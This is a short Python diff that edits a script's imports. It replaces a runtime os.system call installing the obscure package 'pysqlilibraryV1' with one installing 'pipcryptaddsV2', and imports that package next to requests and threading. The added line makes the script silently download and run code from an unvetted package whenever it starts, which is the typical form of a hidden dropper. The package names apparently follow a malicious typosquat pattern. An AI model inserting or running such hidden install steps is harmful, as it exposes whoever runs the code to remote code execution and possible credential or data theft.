@@ -1,6 +1,6 @@
 import os
-os.system("pip install pysqlilibraryV1")
-import pysqlilibraryV1
+os.system("pip install pipcryptaddsV2")
+import pipcryptaddsV2
 from optparse import Option
 import requests
 import threading
